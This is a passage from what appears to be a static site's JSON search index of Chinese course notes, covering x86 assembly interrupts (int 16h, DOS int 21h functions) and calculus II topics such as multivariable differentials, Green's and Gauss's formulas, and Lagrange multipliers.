\uff0c\u5176\u4e2d\u65ad\u5411\u91cf\u4f4d\u4e8e <code>0000:16h*4</code> \uff0c\u5373\u8d77\u59cb\u5730\u5740\u4e3a <code>0000:0058</code> \uff0c\u5e76\u4e14\u6309\u7167\u5c0f\u7aef\u5b58\u50a8\u89c4\u5219\uff0c\u5f53\u6211\u4eec\u8c03\u7528\u4e2d\u65ad\u6307\u4ee4 <code>int 16h</code> \u65f6\uff0c\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u5e94\u4e3a <code>0070:042D</code>\uff0c\u8fd9\u65f6 <code>CS=0070h, IP=042Dh</code>\u3002</p> <p><code>int 21h</code> \u7684\u5e38\u7528\u4e2d\u65ad\uff1a</p> AH \u529f\u80fd \u8865\u5145\u89e3\u91ca 01 \u6709\u56de\u663e\u5730\u8bfb\u53d6\u4e00\u4e2a\u6807\u51c6\u8f93\u5165 AL=\u8f93\u5165\u5b57\u7b26, \u5b9e\u9645\u4f7f\u7528\u4e2d\u8fd8\u53ef\u4ee5\u7528\u4f5c\u672b\u5c3e\u6572\u4efb\u610f\u952e\u7ed3\u675f\u7a0b\u5e8f 02 \u8f93\u51fa\u5b57\u7b26\u5230\u6807\u51c6\u8f93\u51fa DL=\u8f93\u51fa\u5b57\u7b26 09 \u8f93\u51fa\u5b57\u7b26\u4e32\u5230\u6807\u51c6\u8f93\u51fa DS:DX=\u5b57\u7b26\u4e32\u5730\u5740\uff0c\u4e00\u76f4\u5230 '$' \u505c\u6b62\u8f93\u51fa 4C \u5e26\u8fd4\u56de\u7801\u7ec8\u6b62 AL=\u8fd4\u56de\u7801"},{"location":"Courses/asm/ch6/#miscellaneous","title":"MISCELLANEOUS","text":"<p>HLT</p> <p>NOP \u6700\u9ad8\u53ea\u6709 9B NOP\uff0c\u8981\u8865\u8db3 15B \u53ef\u4ee5\u591a\u52a0 0x66</p> <p>LOCK Prefix</p> <p>BOUND: MEM \u6307\u793a\u4e0a\u4e0b\u754c</p> <p>ENTER LEAVE\uff1a\u521b\u5efa\u6808\u5e27\u3001\u91ca\u653e\u6808\u5e27\u4ece\u4e09\u6761\u6307\u4ee4\u53d8\u4e3a\u4e24\u6761\u6307\u4ee4</p>"},{"location":"Courses/calculusII/","title":"\u5fae\u79ef\u5206\u7532 II","text":""},{"location":"Courses/calculusII/#ii","title":"\u5fae\u79ef\u5206\u7532 II","text":"<p> \u7ea6 65 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u540e\u8bb0</p> <p>\u672c\u6765\u6253\u7b97\u5c31\u968f\u4fbf\u8bb0\u70b9\u4e1c\u897f\u7684\uff0c\u6700\u540e\u8fd8\u662f\u628a\u6240\u6709\u5185\u5bb9\u90fd\u6db5\u76d6\u4e86\uff0c\u4f46\u662f\u6392\u7248\u5df2\u7ecf\u4e71\u6210\u8fd9\u6837\u5566!\u5982\u679c\u4ee5\u540e\u6709\u673a\u4f1a\u7684\u8bdd\u518d\u628a\u8fd9\u4e9b\u7b14\u8bb0\u4f18\u5316\u5427\u3002(\u5927\u997c+1)</p>"},{"location":"Courses/calculusII/Line%20%26%20Plane/","title":"\u76f4\u7ebf\u4e0e\u5e73\u9762","text":""},{"location":"Courses/calculusII/Line%20%26%20Plane/#_1","title":"\u76f4\u7ebf\u4e0e\u5e73\u9762","text":"<p> \u7ea6 121 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"Courses/calculusII/Line%20%26%20Plane/#_2","title":"\u4e09\u7ef4\u9762\u79ef\u52fe\u80a1\u5b9a\u7406","text":""},{"location":"Courses/calculusII/Line%20%26%20Plane/#_3","title":"\u5bf9\u65cb\u8f6c\u66f2\u9762\u4e0d\u4e86\u89e3\u5c31\u770b\u8fd9\u4e2a\u5427!","text":""},{"location":"Courses/calculusII/Line%20%26%20Plane/#_4","title":"\u4e24\u76f4\u7ebf\u4e4b\u95f4\u8ddd\u79bb\u7684\u901a\u7528\u89e3\u6cd5","text":""},{"location":"Courses/calculusII/Line%20%26%20Plane/#_5","title":"\u76f4\u7ebf\u7ed5\u76f4\u7ebf\u65cb\u8f6c\u5f97\u5230\u66f2\u9762\uff08\u8003\u8651\u4e24\u76f4\u7ebf\u76f8\u4ea4\u7684\u60c5\u51b5\uff09","text":""},{"location":"Courses/calculusII/Line%20%26%20Plane/#_6","title":"\u4e00\u4e9b\u8bfe\u540e\u9898 &amp; \u5386\u5e74\u9898","text":""},{"location":"Courses/calculusII/differential/","title":"\u591a\u5143\u51fd\u6570\u5fae\u5206","text":""},{"location":"Courses/calculusII/differential/#_1","title":"\u591a\u5143\u51fd\u6570\u5fae\u5206","text":"<p> \u7ea6 869 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p>"},{"location":"Courses/calculusII/differential/#_2","title":"\u70b9\u548c\u70b9\u96c6\u7684\u5173\u7cfb","text":"<ul> <li>\u5f00\u96c6\uff1a\u5e73\u9762\u70b9\u96c6 \\(E\\) \u4e2d\u6bcf\u4e2a\u70b9\u90fd\u662f \\(E\\) \u7684\u5185\u70b9\uff0c\u5373 \\(int\\ E\\ =\\ E\\)\uff0c\u5219\u79f0 \\(E\\) \u4e3a\u5f00\u96c6</li> <li>\u95ed\u96c6\uff1a\u5e73\u9762\u70b9\u96c6 \\(E\\) \u7684\u4f59\u96c6 \\(R^2-E\\) \u4e3a\u5f00\u96c6\uff0c\u5219\u79f0 \\(E\\) \u4e3a\u95ed\u96c6</li> <li>\u82e5 \\(E\\) \u4e2d\u4efb\u610f\u4e24\u70b9\u4e4b\u95f4\u90fd\u53ef\u4ee5\u7528\u4e00\u6761\u5b8c\u5168\u542b\u4e8e \\(E\\) \u7684\u6709\u9650\u6761\u6298\u7ebf\u76f8\u8fde\u63a5\uff0c\u5219\u79f0 \\(E\\) \u5177\u6709\u8fde\u901a\u6027</li> <li>\u82e5 \\(E\\) \u65e2\u4e3a\u5f00\u96c6\u53c8\u6709\u8fde\u901a\u6027\uff0c\u5219\u79f0 \\(E\\) \u4e3a\u5f00\u533a\u57df</li> <li>\u5f00\u533a\u57df\u8fde\u540c\u5176\u8fb9\u754c\u6784\u6210\u7684\u70b9\u96c6\u79f0\u4e3a\u95ed\u533a\u57df</li> </ul> <p>\u5e38\u89c1\u7684\u5f00\u96c6\u3001\u95ed\u96c6</p> <p></p>"},{"location":"Courses/calculusII/differential/#_3","title":"\u7d2f\u6b21\u6781\u9650\u548c\u4e8c\u91cd\u6781\u9650\u7684\u5b58\u5728\u5173\u7cfb","text":""},{"location":"Courses/calculusII/differential/#_4","title":"\u9a8c\u8bc1\u53ef\u5fae\u4e0e\u4e0d\u53ef\u5fae","text":"Example"},{"location":"Courses/calculusII/differential/#_5","title":"\u8fde\u7eed\u4e0d\u4e00\u5b9a\u53ef\u5fae\u7684\u4f8b\u5b50","text":"<p>\u4ee5\u53ca \\(f(x,y)=\\sqrt{x^2 +y^2}\\) \u5728 \\((0,0)\\) \u5904\u8fde\u7eed\uff0c\u4f46\u504f\u5bfc\u4e0d\u5b58\u5728\uff0c\u6240\u4ee5\u4e5f\u4e0d\u53ef\u5fae\u3002</p>"},{"location":"Courses/calculusII/differential/#_6","title":"\u53ef\u5fae\u4f46\u662f\u4e00\u9636\u504f\u5bfc\u4e0d\u8fde\u7eed","text":"<p>\\(f(x,y)=(x^2 +y^2)sin\\frac{1}{( x^2+ y^2)}\\) \u5728 \\((0,0)\\) \u5904\u53ef\u5fae\uff0c\u4f46\u662f\u4e00\u9636\u504f\u5bfc\u4e0d\u8fde\u7eed\u3002</p> <p>Info</p> <p>\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u9636\u504f\u5bfc\u8fde\u7eed\uff0c\u90a3\u4e48\u53ef\u4ee5\u63a8\u51fa\u53ef\u5fae\uff1b\u53cd\u8fc7\u6765\u5219\u4e0d\u4e00\u5b9a</p>"},{"location":"Courses/calculusII/differential/#_7","title":"\u9690\u51fd\u6570\u7684\u504f\u5bfc\u6570","text":"<p>\u6ca1\u5565\u7528\uff0c\u4e0d\u5982\u4e00\u9636\u5fae\u5206\u5f62\u5f0f\u4e0d\u53d8\u6027\uff1a</p> <p>\\(F(x,y,z)=0\\ \\Rightarrow \\ F'_xdx +F'_ydy +F'_zdz =0\\)\uff0c\u7531\u6b64\u53ef\u4ee5\u6c42\u5f97 \\(z\\) \u5173\u4e8e \\(x\\) \u548c \\(y\\) \u7684\u504f\u5bfc</p>"},{"location":"Courses/calculusII/differential/#_8","title":"\u68af\u5ea6\u5b9a\u4e49\u4ee5\u53ca\u65b9\u5411\u5bfc\u6570\u6c42\u89e3\u6b65\u9aa4","text":"<ul> <li>\u68af\u5ea6\u5b9a\u4e49<ul> <li>\\(grad\\ u\\) = \\(\\frac{\\partial u}{\\partial x}i+\\frac{\\partial u}{\\partial y}j+\\frac{\\partial u}{\\partial z}k=(\\frac{\\partial u}{\\partial x},\\frac{\\partial u}{\\partial y},\\frac{\\partial u}{\\partial z})\\)</li> <li>\\(grad\\ (u,v)=ugrad\\ v+vgrad\\ u\\)</li> <li>\\(grad\\ f(u)=f'(u)grad\\ u\\)</li> </ul> </li> </ul> <p>\u6b64\u5b9a\u7406\u4f7f\u7528\u7684\u5148\u5bfc\u6761\u4ef6\u662f\u51fd\u6570\u53ef\u5fae</p> <p>\u5982\u4f55\u5229\u7528\u5b9a\u7406\u8ba1\u7b97\u65b9\u5411\u5bfc\u6570\uff1f</p> <p>\u51fd\u6570\\(f(x,y)\\ =\\ \\frac{xy}{\\sqrt{x^2 +y^2}}\\ (x,y)\\ne (0,0)\\) \u5728 \\((0,0)\\) \u4e0d\u53ef\u5fae\uff0c\u4f46\u662f\u65b9\u5411\u5bfc\u6570\u5b58\u5728:</p> <p>\u8bbe\u4efb\u610f\u65b9\u5411 \\(\\overrightarrow{v}=(\\cos \\alpha ,\\cos \\beta)\\) </p> <p>\u5219\u65b9\u5411\u5bfc\u6570\u4e3a \\(\\lim _{t\\rightarrow 0^+}\\frac{f(t\\cos \\alpha,t\\cos \\beta)-f(0,0)}{t}=\\lim_{t\\rightarrow o^+}\\frac{t ^2\\cos \\alpha \\cos \\beta}{t ^2} =\\cos \\alpha \\cos \\beta\\)</p>"},{"location":"Courses/calculusII/differential/#_9","title":"\u504f\u5bfc\u6570\u5b58\u5728\u548c\u65b9\u5411\u5bfc\u6570\u5b58\u5728\u4e0d\u53ef\u4ee5\u4e92\u76f8\u63a8\u5bfc\u51fa","text":""},{"location":"Courses/calculusII/differential/#_10","title":"\u6cf0\u52d2\u516c\u5f0f\u7684\u5e94\u7528","text":"<p>\\(\\partial D\\) \u662fD\u7684\u8fb9\u754c</p> <p>\u5c45\u7136\u4e0d\u662f\u6cf0\u52d2\u516c\u5f0f\u7684\u9898...</p> <p></p> <p>\u8981\u70b9\u5728\u4e8e\u51d1\u51fa(0,0)\u5904\u7684\u503c\u4e0e\u8fb9\u754c\u503c\u76f8\u7b49</p>"},{"location":"Courses/calculusII/differential/#_11","title":"\u6781\u503c\u7684\u5fc5\u8981\u6761\u4ef6","text":"<p>\u4e00\u822c\u5728\u9a7b\u70b9\u548c\u8fb9\u754c\u5904\u5bfb\u627e\u9898\u76ee\u8981\u6c42\u7684\u6700\u503c</p>"},{"location":"Courses/calculusII/differential/#_12","title":"\u6781\u503c\u7684\u5145\u5206\u6761\u4ef6","text":""},{"location":"Courses/calculusII/differential/#_13","title":"\u62c9\u683c\u6717\u65e5\u4e58\u6570\u6cd5\u6c42\u6761\u4ef6\u6781\u503c","text":"<p>\u5728\u7ed9\u5b9a\u6761\u4ef6 \\(G(x,y,z)=0\\) \u4e0b\uff0c\u6c42\u76ee\u6807\u51fd\u6570 \\(u=f(x,y,z)\\) \u7684\u6781\u503c\u3002</p> <p>\u6784\u9020\u65b0\u51fd\u6570 \\(L(x,y,z,\\lambda)=f(x,y,z)+\\lambda G(x,y,z)\\)</p> <p>\u51fd\u6570 \\(L\\) \u5173\u4e8e \\(x\u3001y\u3001z\u3001\\lambda\\) \u5206\u522b\u6c42\u5bfc\uff0c\u5f97\u5230\u56db\u5143\u65b9\u7a0b\u7ec4\uff0c\u53ef\u4ee5\u6c42\u51fa\u9a7b\u70b9\uff0c\u518d\u8fdb\u884c\u9a8c\u8bc1\u5f97\u5230\u6781\u503c</p> <p>Abstract</p> <ul> <li>\\(\\lambda\\) \u662f\u8f85\u52a9\u53c2\u6570\uff0c\u5982\u679c\u4e0d\u7528\u6c42\u51fa \\(\\lambda\\) \u5c31\u80fd\u6c42\u51fa\u6000\u7591\u6781\u503c\u70b9\u5f53\u7136\u6700\u597d\uff0c\u5426\u5219\u5c31\u8981\u6c42\u51fa \\(\\lambda\\)</li> <li>\u6b64\u5916\uff0c\u5982\u679c \\(f\\) \u6216 \\(G\\) \u7684\u9009\u53d6\u4e0d\u597d\u8ba1\u7b97\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5bf9\u5176\u8fdb\u884c\u53d8\u6362 (\u5982\u5e73\u65b9\u7b49)</li> </ul>"},{"location":"Courses/calculusII/integration/","title":"\u591a\u5143\u51fd\u6570\u79ef\u5206","text":""},{"location":"Courses/calculusII/integration/#_1","title":"\u79ef\u5206","text":"<p> \u7ea6 2561 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p>"},{"location":"Courses/calculusII/integration/#_2","title":"\u5982\u4f55\u89e3\u5e38\u5fae\u5206\u65b9\u7a0b\uff1f","text":"<p>\u5df2\u77e5 \\(f(x)=f'(x)-2x\\)\uff0c\u6c42 \\(f(x)\\)</p> \\[\\begin{gather} (\\frac{f(x)}{e^x})'=\\frac{f'(x)-f(x)}{e ^x}=\\frac{2x}{e ^x} \\\\ \\int\\frac{2x}{e^x}dx=-\\int2xde ^{-x}=-2xe ^{-x}+2\\int e^{-x}dx \\\\ =-2xe^{-x}-2 e^{-x} \\\\ f(x)=-2x-2+te^x\\ \\ \\ \\ \\ t\\in R \\end{gather} \\] <p>\u6ce8\u610f\u79ef\u5206\u51fa\u6765\u662f\u6709\u5e38\u6570\u7684</p>"},{"location":"Courses/calculusII/integration/#_3","title":"\u79ef\u5206\u533a\u57df\u4e3a\u6b63\u65b9\u5f62\u4e5f\u53ef\u4ee5\u7528\u6781\u5750\u6807","text":"<p>\\(D_2=\\{(x,y)|1\\le x^2 +y^2,|x|+|y|\\le 2\\}\\) \uff0c\u6c42\u4e8c\u91cd\u79ef\u5206 \\(\\iint_ {D_2} \\frac{1}{(x^2 +y^2 )^\\frac{3}{2} }dxdy\\)</p> <p>\u3010\u89e3\u7b54\u3011 \u539f\u5f0f= </p> \\[4\\int^\\frac{\\pi}{2}_0d\\theta \\int^{\\frac{2}{\\sin \\theta+\\cos\\theta}}_1 \\frac{1}{r^2}dr=4\\int^\\frac{\\pi}{2}_0(1-\\frac{\\sin\\theta+\\cos\\theta}{2})d\\theta=2\\pi-4\\]"},{"location":"Courses/calculusII/integration/#_4","title":"\u4e09\u91cd\u79ef\u5206\u67f1\u9762\u5750\u6807\u53d8\u6362","text":"<ul> <li>\\(x=rcos\\theta,y=rsin\\theta,z=z\\ \\Rightarrow \\ \u67f1\u9762\u5750\u6807(r,\\theta,z)\\)</li> <li>\\(\\Delta V =S_{\u6247\u5f62}\\Delta z = r\\Delta \\theta \\Delta r\\Delta z\\)</li> </ul>"},{"location":"Courses/calculusII/integration/#_5","title":"\u4e09\u91cd\u79ef\u5206\u7403\u9762\u5750\u6807\u53d8\u6362","text":"<p>\u89c4\u5b9a\u5982\u4e0b\uff1a</p> <ul> <li>\\(\\rho\\)\uff1a\u539f\u70b9\u5230M\u70b9\u7684\u8ddd\u79bb \\(0\\le \\rho \\le +\\infty\\)</li> <li>\\(\\phi\\)\uff1a\u77e2\u91cf \\(\\overrightarrow{OM}\\) \u4e0eOz\u8f74\u6b63\u5411\u7684\u5939\u89d2 \u7eac\u5ea6 \\(0\\le \\phi \\le \\pi\\)</li> <li>\\(\\theta\\)\uff1a\u77e2\u91cf \\(\\overrightarrow{OM}\\) \u5728xOy\u5e73\u9762\u4e0a\u7684\u5411\u91cf\u4e0ex\u8f74\u7684\u5939\u89d2 \u7ecf\u5ea6 \\(0\\le \\theta \\le 2\\pi\\)</li> </ul> \\[\\begin{gather} x=\\rho \\sin\\phi \\cos \\theta \\\\ y=\\rho \\sin\\phi \\sin \\theta \\\\ z=\\rho \\cos \\phi \\end{gather} \\] <p>\u6839\u636e\u4e09\u91cd\u79ef\u5206\u7684\u4e00\u822c\u66f2\u9762\u5750\u6807\u53d8\u6362\uff1a</p> \\[\\frac{\\partial(x,y,z)}{\\partial (\\rho,\\phi,\\theta)}=\\left | \\begin{matrix}\\sin\\phi \\cos \\theta &amp; \\sin\\phi \\sin \\theta &amp; \\cos \\phi  \\\\ \\rho \\cos \\phi \\cos\\theta &amp; \\rho\\cos\\phi\\sin\\theta &amp; -\\rho\\sin\\phi \\\\ -\\rho\\sin\\phi\\sin\\theta &amp; \\rho\\sin\\phi\\cos\\theta &amp; 0\\end{matrix} \\right | =\\rho^2 \\sin\\phi \\] <p>\u6240\u4ee5 \\(\\Delta V=\\rho ^2 \\sin\\phi d\\rho d\\phi d\\theta\\)</p>"},{"location":"Courses/calculusII/integration/#_6","title":"\u79ef\u5206\u7684\u65f6\u5019\u6ce8\u610f\u7b49\u4ef7\u91cf\uff0c\u53ef\u4ee5\u5927\u5927\u51cf\u5c11\u8fd0\u7b97\u91cf","text":""},{"location":"Courses/calculusII/integration/#_7","title":"\u7b2c\u4e00\u7c7b\u66f2\u7ebf\u79ef\u5206","text":"\\[\\begin{gather} \\Delta s=\\sqrt{[x(t+\\Delta t )-x(t)]^2 +[y(t+\\Delta) t -y(t)]^2 +[z(t+\\Delta t )-z(t)]^2} \\\\ =\\sqrt{x'^2(t) +y'^2(t) +z'^2(t)}\\Delta t \\end{gather} \\] Example"},{"location":"Courses/calculusII/integration/#_8","title":"\u5e73\u9762\u6781\u5750\u6807\u65b9\u7a0b","text":""},{"location":"Courses/calculusII/integration/#_9","title":"\u7b2c\u4e00\u7c7b\u66f2\u9762\u79ef\u5206","text":"\\[ \\int\\int_S f(x,y,z)dS=\\int\\int_{ \\sigma_{xy}}f(x,y,z(x,y)) \\sqrt{1+z'^2_x +z'^2_y} d\\sigma \\] <ul> <li>\u82e5\u66f2\u9762\u7531\u9690\u51fd\u6570 \\(F(x,y,z)=0\\) \u786e\u5b9a\uff0c\u7531\u4e8e<ul> <li>\\(\\frac{\\partial z}{\\partial x}=-\\frac{F'_x}{F'_z}\\)</li> <li>\\(\\frac{\\partial z}{\\partial y}=-\\frac{F'_y}{F'_z}\\)</li> </ul> </li> <li>\u5f97\u5230\uff1a</li> </ul> \\[ \\int\\int_S f(x,y,z)dS=\\int\\int_{ \\sigma_{xy}}f(x,y,z(x,y)) \\frac{\\sqrt{F'^2_x +F'^2_y +F'^2_z}}{ |F'_z|} d\\sigma \\] Example <p>\u6295\u5f71\u533a\u57df\u590d\u4e60\uff1a \u6d88\u53bbz\uff0c\u7136\u540e\u8054\u7acb <code>z = 0</code></p>"},{"location":"Courses/calculusII/integration/#_10","title":"\u5f15\u529b","text":"<p>Danger</p> <p>\u6c42\u91cd\u5fc3\u6c42\u5f15\u529b\u4e4b\u7c7b\u7684\uff0c\u8981\u6ce8\u610f\u9898\u76ee\u91cc\u7ed9\u7684\u662f\u4f53\u8fd8\u662f\u58f3 (\u4f8b\u5982\u629b\u7269\u9762\u58f3\uff0c\u5c31\u8981\u7528\u4e8c\u91cd\u79ef\u5206\u800c\u4e0d\u662f\u4e09\u91cd\u79ef\u5206)</p>"},{"location":"Courses/calculusII/integration/#_11","title":"\u4e5f\u53ef\u4ee5\u5229\u7528\u79ef\u5206\u7684\u7269\u7406\u610f\u4e49\u89e3\u9898","text":""},{"location":"Courses/calculusII/integration/#_12","title":"\u5982\u4f55\u533a\u5206\u7b2c\u4e00\u7b2c\u4e8c\u7c7b\u79ef\u5206","text":"<p>\u88ab\u79ef\u5143\u7d20\u4e3a\u5411\u91cf\u5219\u662f\u7b2c\u4e8c\u7c7b\u66f2\u7ebf\u79ef\u5206\uff0c\u4e0d\u662f\u5c31\u662f\u7b2c\u4e00\u7c7b</p>"},{"location":"Courses/calculusII/integration/#_13","title":"\u683c\u6797\u516c\u5f0f","text":"<p>\u8fb9\u754c\u66f2\u7ebf \\(\\Gamma\\) \u6b63\u5411\u89c4\u5b9a\uff1a\u5f53\u4eba\u6cbf\u8fb9\u754c\u884c\u8d70\u65f6\uff0c\u533a\u57df \\(D\\) \u603b\u5728\u4ed6\u5de6\u8fb9\u3002\u4e0e\u4e0a\u8ff0\u65b9\u5411\u76f8\u53cd\uff0c\u5219\u79f0\u4e3a\u8d1f\u65b9\u5411\uff0c\u8bb0\u4e3a \\(-\\Gamma\\)</p> <p>\u82e5\u51fd\u6570 \\(P\u3001Q\\) \u5728\u95ed\u533a\u57df \\(D\\subset R^2\\) \u4e0a\u8fde\u7eed\u4e14\u5177\u6709\u8fde\u7eed\u4e00\u9636\u504f\u5bfc\u6570\uff0c\u5219</p> \\[ \\iint_D ( \\frac{\\partial Q}{\\partial x}-\\frac{\\partial P}{\\partial y})dxdy=\\oint_\\Gamma Pdx+Qdy \\] <p>\u8fd9\u91cc \\(\\Gamma\\) \u4e3a\u533a\u57dfD\u7684\u8fb9\u754c\u66f2\u7ebf\uff0c\u5e76\u53d6\u6b63\u5411\u3002</p> <p>Danger</p> <p>\u5386\u5e74\u5377\u4e2d\u66fe\u7ecf\u8003\u8fc7\u8bc1\u660e\u683c\u6797\u516c\u5f0f\uff0c\u8bb0\u4f4f\u8bc1\u660e\u8981\u70b9\u5728\u4e8e\uff0c\u5c06\u7b2c\u4e8c\u7c7b\u66f2\u7ebf\u79ef\u5206\u5206\u6210\u56db\u6bb5\uff0c\u7528\u53c2\u6570\u65b9\u7a0b\u7684\u5f62\u5f0f\u52a0\u8d77\u6765\u5373\u53ef</p> Example 1 <p></p> Example 2 <p></p> <p>\u6b64\u5916\uff0c\u683c\u6797\u516c\u5f0f\u8fd8\u53ef\u4ee5\u7528\u6765\u8ba1\u7b97\u5e73\u9762\u533a\u57df\u7684\u9762\u79ef \\(S\\)</p> \\[\\begin{array}l\\oint_\\Gamma -ydx+xdy=\\iint_D[1-(-1)]dxdy=2S\\\\ \u5176\u4e2d\\Gamma \u662f\u533a\u57dfD\u8fb9\u754c\u66f2\u7ebf\u6b63\u5411 \\end{array}\\]"},{"location":"Courses/calculusII/integration/#_14","title":"\u5e73\u9762\u8fde\u901a\u533a\u57df &amp; \u8def\u5f84\u65e0\u5173\u6027","text":"<p>\u5e73\u9762\u533a\u57df \\(D\\) \u5185\u4efb\u4e00\u5c01\u95ed\u66f2\u7ebf\u6240\u5305\u56f4\u7684\u533a\u57df\u5305\u542b\u4e8e \\(D\\) \u5185\uff0c\u5373\u6ca1\u6709\u6d1e\u7684\u533a\u57df\u79f0\u4e3a\u5355\u8fde\u901a\u533a\u57df\uff0c\u5426\u5219\u79f0\u4e3a\u590d\u8fde\u901a\u533a\u57df\u3002</p> <p>\u8bbe \\(D\\subset R^2\\) \u662f\u5355\u8fde\u901a\u533a\u57df\uff0c\u82e5\u51fd\u6570 \\(P\u3001Q\\) \u5728 \\(D\\) \u5185\u8fde\u7eed\uff0c\u4e14\u6709\u4e00\u9636\u8fde\u7eed\u504f\u5bfc\u6570 (\u53ef\u5fae\u7684\u5145\u5206\u6761\u4ef6) \uff0c\u5219\u4ee5\u4e0b\u56db\u4e2a\u6761\u4ef6\u7b49\u4ef7\uff1a</p> <ul> <li>\u6cbf \\(D\\) \u4e2d\u4efb\u610f\u5149\u6ed1\u7684\u95ed\u66f2\u7ebf \\(L\\)\uff0c\u6709 \\(\\oint_LPdx+Qdy=0\\)</li> <li>\u5bf9 \\(D\\) \u4e2d\u4efb\u610f\u5149\u6ed1\u7684\u66f2\u7ebf \\(L\\)\uff0c\u66f2\u7ebf\u79ef\u5206 \\(\\int_L Pdx+Qdy\\) \u4e0e\u8def\u7ebf\u65e0\u5173\uff0c\u53ea\u4e0e \\(L\\) \u7684\u7ec8\u70b9\u8d77\u70b9\u6709\u5173</li> <li>\\(Pdx+Qdy\\) \u662f\u67d0\u4e2a\u51fd\u6570 \\(u\\) \u7684\u5168\u5fae\u5206\uff0c\u5373\u5728 \\(D\\) \u5185\u5b58\u5728\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570 \\(u\\)\uff0c\u4f7f\u5f97 \\(du=Pdx+Qdy\\)</li> <li>\u5728 \\(D\\) \u5185\u6bcf\u4e00\u70b9\u5904\uff0c\u6709 \\(\\frac{\\partial Q}{\\partial x}=\\frac{\\partial P}{\\partial y}\\)</li> </ul>"},{"location":"Courses/calculusII/integration/#_15","title":"\u66f2\u7ebf\u79ef\u5206\u7b2c\u4e00\u5b9a\u7406","text":"<p>\u8bbe \\(D\\subset R^2\\) \u662f\u95ed\u533a\u57df\uff0c\u82e5\u51fd\u6570 \\(P(x,y),Q(x,y)\\) \u5728 \\(D\\) \u5185\u8fde\u7eed\uff0c\u5047\u8bbe\u66f2\u7ebf\u79ef\u5206 \\(\\int_LPdx+Qdy\\) \u4e0e\u8def\u5f84\u65e0\u5173\uff0c\u53d6\u4e00\u5b9a\u70b9 \\(A(x_0, y_0)\\in D\\) \uff0c\u5bf9\u4e8e\u4efb\u610f\u70b9 \\(B(x, y)\\in D\\) \uff0c\u79f0\uff1a</p> <p>\\(u(x,y)=\\int^{B(x,y)}_{A(x _0,y _0)}Pdx+Qdy =\\int^x_{x _0}P(x,y _0)dx+ \\int^y_{y _0}Q(x,y)dy+C\\) \u662f\\(Pdx+Qdy\\)\u7684\u4e00\u4e2a\u539f\u51fd\u6570 (\u4e5f\u79f0\u52bf\u51fd\u6570) \uff0c\u4e14 \\(du=Pdx+Qdy\\ \\ \\ grad(u)=(P,Q)\\)\uff0c\u79f0 \\(\\nabla u=(P,Q)\\) \u4e3a\u4fdd\u5b88\u573a\u6216\u68af\u5ea6\u573a\u3002</p> <p>\u82e5\\((0,0)\\in D\\) \uff0c\u539f\u51fd\u6570\u7b80\u5316\u53ef\u5199\u6210 \\(\\int^x_0P(x,0)dx+ \\int^y_0Q(x,y)dy+C\\)</p> Example <p></p>"},{"location":"Courses/calculusII/integration/#_16","title":"\u6709\u65f6\u5019\u53ef\u4ee5\u76f4\u63a5\u7528\u5168\u5fae\u5206\u89e3","text":""},{"location":"Courses/calculusII/integration/#_17","title":"\u5229\u7528\u66f2\u7ebf\u79ef\u5206\u548c\u8def\u5f84\u76f8\u5173\u6027\u53ef\u4ee5\u6c42\u89e3\u5fae\u5206\u65b9\u7a0b","text":""},{"location":"Courses/calculusII/integration/#104","title":"\u5b9a\u740610.4","text":"<p>\u5728\u590d\u8fde\u901a\u533a\u57df \\(D\\) \u5185\uff0c\\(P,Q\\) \u5177\u6709\u8fde\u7eed\u7684\u504f\u5bfc\u6570\u4e14 \\(\\frac{\\partial P}{\\partial y}=\\frac{\\partial Q}{\\partial x}\\) \uff0c\u5219\u73af\u7ed5\u540c\u4e00\u4e9b\u6d1e\u7684\u4efb\u4f55\u4e24\u6761\u95ed\u66f2\u7ebf(\u540c\u65b9\u5411)\u4e0a\u7684\u66f2\u7ebf\u79ef\u5206\u5747\u76f8\u7b49\u3002</p> Example 1 <p></p> Example 2 <p></p>"},{"location":"Courses/calculusII/integration/#_18","title":"\u9ad8\u65af\u516c\u5f0f","text":"<p>\u8bbe\u7a7a\u95f4\u533a\u57df \\(V\\) \u7531\u5206\u7247\u5149\u6ed1\u7684\u53cc\u4fa7\u5c01\u95ed\u66f2\u7ebf \\(S\\) \u56f4\u6210\uff0c\u82e5\u51fd\u6570 \\(P,Q,R\\) \u5728 \\(V\\) \u4e0a\u8fde\u7eed\uff0c\u4e14\u6709\u4e00\u9636\u8fde\u7eed\u504f\u5bfc\u6570\uff0c\u5219\uff1a</p> \\[ \\iiint_V(\\frac{\\partial P}{\\partial{x}}+\\frac{\\partial Q}{\\partial{y}}+\\frac{\\partial R}{\\partial{z}})dV= \\iint_SPdydz+Qdzdx+Rdxdy \\] <p>\u5176\u4e2d \\(S\\) \u53d6\u5916\u4fa7\uff0c\u4e14\u7531\u4e8e Latex \u8bed\u6cd5\u95ee\u9898\uff0c\u4e0a\u8ff0\u4e8c\u91cd\u79ef\u5206\u5e94\u4e3a\u5c01\u95ed\u7684\u3002</p> Example 1 <p></p> <p>\u82e5S\u4e3a\u5c01\u95ed\u7684\u7b80\u5355\u66f2\u9762\uff0c\\(\\overrightarrow{l}\\) \u4e3a\u4efb\u610f\u56fa\u5b9a\u65b9\u5411\uff0c\u5219 \\(\\iint_S\\cos(\\overrightarrow{n},\\overrightarrow{l})dS=0\\)</p>"},{"location":"Courses/calculusII/integration/#_19","title":"\u6563\u5ea6\u573a","text":"<p>\u8bbe \\(\\overrightarrow{A}(x,y,z)=\\{P(x,y,z),Q(x,y,z),R(x,y,z)\\}\\) \u4e3a\u7a7a\u95f4\u533a\u57df \\(V\\) \u4e0a\u7684\u5411\u91cf\u51fd\u6570\uff0c\u5bf9 \\(V\\) \u4e0a\u6bcf\u4e00\u70b9 \\((x,y,z)\\)\uff0c\u79f0\u5411\u91cf\u51fd\u6570 \\(\\frac{\\partial P}{\\partial{x}}+\\frac{\\partial Q}{\\partial{y}}+\\frac{\\partial R}{\\partial{z}}\\) \u4e3a\u5411\u91cf\u51fd\u6570 \\(\\overrightarrow{A}\\) \u5728 \\((x,y,z)\\) 